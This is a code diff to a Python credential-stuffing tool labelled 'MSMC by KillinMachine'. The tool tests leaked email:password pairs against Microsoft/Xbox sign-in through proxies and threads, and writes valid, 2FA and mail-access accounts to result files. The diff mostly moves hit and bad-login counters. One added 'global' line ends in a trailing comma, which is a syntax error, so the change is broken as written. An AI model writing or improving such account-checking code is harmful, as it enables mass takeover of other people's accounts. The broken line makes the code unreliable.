@@ -54,8 +54,6 @@ def get_xbox_rps(session, email, password, urlPost, sFTTag, tries=0):
                 twofa+=1
                 if screen == "'2'": print(Fore.MAGENTA+f"2FA: {email}:{password}")
                 with open(f"results/{day}/2fa.txt", 'a') as file: file.write(f"{email}:{password}\n")
-                checked+=1
-                cpm+=1
                 return None
             #elif "That Microsoft account" not in login_request.text:
             #    if tries < 5:
@@ -64,8 +62,6 @@ def get_xbox_rps(session, email, password, urlPost, sFTTag, tries=0):
             #    else: 
             #        bad+=1
             #        if screen == "'2'": print(Fore.LIGHTRED_EX+f"Bad: {email}:{password}")
-            #        checked+=1
-            #        cpm+=1
             #        return None
             #elif "Your account or password is incorrect." not in login_request.text:
             #    if tries < 5:
@@ -74,14 +70,10 @@ def get_xbox_rps(session, email, password, urlPost, sFTTag, tries=0):
             #    else: 
             #        bad+=1
             #        if screen == "'2'": print(Fore.LIGHTRED_EX+f"Bad: {email}:{password}")
-            #        checked+=1
-            #        cpm+=1
             #        return None
             elif "Sign in to" in login_request.text:
                 bad+=1
                 if screen == "'2'": print(Fore.LIGHTRED_EX+f"Bad: {email}:{password}")
-                checked+=1
-                cpm+=1
                 return None
     except:
         retries+=1
@@ -119,7 +111,7 @@ def optifine(name):
     except: return "Unknown"
 
 def authenticate(email, password, proxy):
-    global hits, vm
+    global hits, vm, checked, cpm
     try:
         session = requests.Session()
         session.proxies = proxy
@@ -151,6 +143,8 @@ def authenticate(email, password, proxy):
                             if screen == "'2'": print(Fore.GREEN+f"Valid Mail: {email}:{password}")
                             vm+=1
                             with open(f"results/{day}/Valid_Mail.txt", 'a') as file: file.write(f"{email}:{password}\n")
+        checked+=1
+        cpm+=1
     except:
         retries+=1
         threading.Thread(target=Checker, args=(email, password)).start()
@@ -280,7 +274,7 @@ def loadconfig():
     webhook_message = str(read_file['Settings']['WebhookMessage'])
 
 def Main():
-    global proxytype, screen
+    global proxytype, screen, bad, checked, cpm,
     loadconfig()
     utils.set_title("MSMC by KillinMachine")
     os.system('cls')
@@ -316,6 +310,10 @@ def Main():
                     num+=1
                     if email != "" and password != "":
                         threading.Thread(target=Checker, args=(email, password)).start()
+                    else:
+                         bad+=1
+                         checked+=1
+                         cpm+=1
                 except:
                     finishedscreen()
             else:
